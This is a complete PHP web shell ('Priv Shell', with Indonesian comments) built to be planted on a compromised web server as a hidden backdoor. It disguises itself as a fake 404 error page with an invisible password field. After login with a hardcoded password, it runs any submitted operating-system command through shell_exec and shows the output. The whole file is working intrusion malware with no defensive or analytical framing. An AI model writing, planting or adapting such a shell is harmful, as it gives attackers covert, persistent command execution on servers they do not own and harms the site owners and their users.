<?php
// Priv Shell
// Silence Because Yourself

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();

// Konfigurasi Password
$pass = "admin1"; // Sebaiknya gunakan password_hash untuk keamanan lebih baik

// Fungsi untuk validasi login
if ($_POST['password']) {
    if ($_POST['password'] === $pass) {
        $_SESSION['forbidden'] = $pass;
        header("Location: ?zet");
        exit();
    } else {
        echo "<script>alert('Password salah!');</script>";
    }
}

// Fungsi untuk logout
if (isset($_REQUEST['logout'])) {
    session_destroy();
    header("Location: ?");
    exit();
}

// Halaman login
if (!isset($_SESSION['forbidden'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <meta name="theme-color" content="black">
    <style>
        /* Sembunyikan elemen form */
        body {
            background-color: white;
            color: black;
            font-family: Arial, sans-serif;
        }
        form {
            display: inline-block;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            text-align: center;
            cursor: pointer;
        }
        input[type="password"] {
            opacity: 0; /* Sembunyikan input */
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 40px;
            border: none;
            background-color: transparent;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>

    <form method="post">
        <input type="password" name="password" placeholder="Enter Password">
    </form>
</body>
</html>
<?php
    exit();
}

// Jika login berhasil, tampilkan shell sederhana
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
        }
        textarea {
            width: 100%;
            height: 200px;
            margin-bottom: 10px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Priv Shell</h1>
    <a href="?logout" style="color: red;">Logout</a>
    <form method="post" action="?page=execute">
        <textarea name="cmd" placeholder="Enter command here"></textarea>
        <br>
        <button type="submit">Execute</button>
    </form>
    <?php
    // Menjalankan perintah jika ada input
    if ($_GET['page'] === "execute" && isset($_POST['cmd'])) {
        echo "<pre>";
        echo htmlspecialchars(shell_exec($_POST['cmd']));
        echo "</pre>";
    }
    ?>
</body>
</html>
